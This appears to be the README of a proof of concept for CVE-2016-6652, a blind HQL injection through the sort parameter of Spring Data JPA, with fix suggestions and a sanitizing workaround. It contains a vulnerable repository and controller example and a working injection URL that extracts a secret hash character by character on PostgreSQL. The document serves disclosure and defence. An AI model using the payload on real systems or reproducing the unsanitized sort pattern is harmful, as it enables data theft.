PoC for blind SQL injection bug found in [Solita Webhack 2016](http://www.webhack.fi/).

* Founders: Niklas Särökaari, Joona Immonen
* Analysis: Arto Santala, Niklas Särökaari, Joona Immonen, Antti Virtanen, Michael Holopainen
* PoC: Antti Ahola, Antti Virtanen

CVE: (https://pivotal.io/security/cve-2016-6652)

This has been fixed in Spring Data with this commit: (https://github.com/spring-projects/spring-data-jpa/commit/b8e7fe)

## The problem briefly

[Spring Data](http://projects.spring.io/spring-data/) relies on helper class QueryUtils, which does the following:

```
QueryUtils.applySorting("select person from Person person", new Sort("firstName"))
```

Effectively this doesn't validate or escape the string given to *Sort* constructor properly. This method is not normally
accessed directly by application developers as creating raw queries with plain strings is not a good practice, but
relatively innocent code can inadvertently contain SQL injection because of this. The PoC demonsrates how this
might realistically happen (and did happen in our real-life application).

Many tutorials for [Spring Data JPA](http://projects.spring.io/spring-data-jpa/) explain that it's possible to create sortable queries easily, without actually worrying about SQL in this manner:

```
interface PersonRepository extends PagingAndSortingRepository<Person, Long> {
  
  @Query("SELECT person FROM Person person WHERE " +
      "LOWER(person.firstName) LIKE LOWER(CONCAT('%',:searchTerm, '%')) OR " +
      "LOWER(person.lastName) LIKE LOWER(CONCAT('%',:searchTerm, '%'))")
  List<Person> findBySearchTerm(@Param("searchTerm") String searchTerm, Sort sort);
}
```

The query doesn't contain *ORDER BY* but Spring will handle it, using the aforementioned *applySorting* method. Creating a sortable REST interface is easy:

```
    @RequestMapping("/personfind")
    public Iterable<PersonDTO> personFind(@RequestParam(value="order", defaultValue="firstName") String order,
                                          @RequestParam(value="term" ) String term) {
      Iterable<Person> persons = personRepo.findBySearchTerm(term, new Sort(order));
      // mapping to PersonDTO omitted.
```

Search parameter *term* gets properly sanitized, but parameter *sort* will not be sanitized in this case. 

## How to exploit?

Exploiting is not as straightforward as it would seem, because it depends on multiple factors. The query is not a raw SQL query and tricks like ```"union all select * from .."``` may not work. It might be a JPQL-query or HQL query, but still exploitable. See [HQL for pentesting](http://paulsec.github.io/blog/2014/05/05/blind-hql-injection-in-rest-api-using-h2-dbms/) for further ideas.

### A short example:

The search term selects only two records from the database. Ordering by *firstName* yields Huppu,Tuppu. Boolean blind HQL injection is possible by checking if the order changes. The content of a secret hash can be deduced by playing with the *order* parameter. 

![before](sqlmapping_1.png)

![after](sqlmapping_2.png)

What exactly happens depends on the underlying database. With PostgreSQL 9.2, brute forcing character by character works like this. 

Example injection:
```
http://localhost:8080/personfind?term=uppu&order=(case%20when%20%20substr(secretHash,1,1)=%27E%27%20then%201%20else%202%20end)
```

PostgreSQL query after Spring HQL translation:
```
select person0_.id as id1_1_, person0_.first_name as first_na2_1_, person0_.last_name as last_nam3_1_, person0_.secret_hash as secret_h4_1_ from person person0_ where lower(person0_.first_name) like lower(('%'||$1||'%')) or lower(person0_.last_name) like lower(('%'||$2||'%')) order by case when substr(person0_.secret_hash, 1, 1)='E' then 1 else 2 end asc
```

## Suggestions 

* Spring Data should sanitize the strings encapsulated in the *Order* class. This might mean that some valid, but weird, definitions would no longer work, but for the majority of programmers this should be the default behavior. And it's possible to introduce a static factory method to create "unsafe Order" for the marginal cases. This might break some of the current applications.

* If *Order* will not be changed, introduce a static factory method to create "safe Order" and warn programmers that the current best practice is vulnerable and prone to errors.

* Meanwhile, a workaround is to sanitize the order in the application level using something like this:

```
 /**
  * This utility will filter away any characters that are not used in column names,
  * granting immunity to sql injection attacks
  *
  * @param value
  * @return
  */
  private String cleanseString(String value) {
    return value.replaceAll("[^A-Za-z0-9_.]", "");
  }
```

This will break function calls in *order by* (as parenthesis get removed), which may not be suitable for all users.



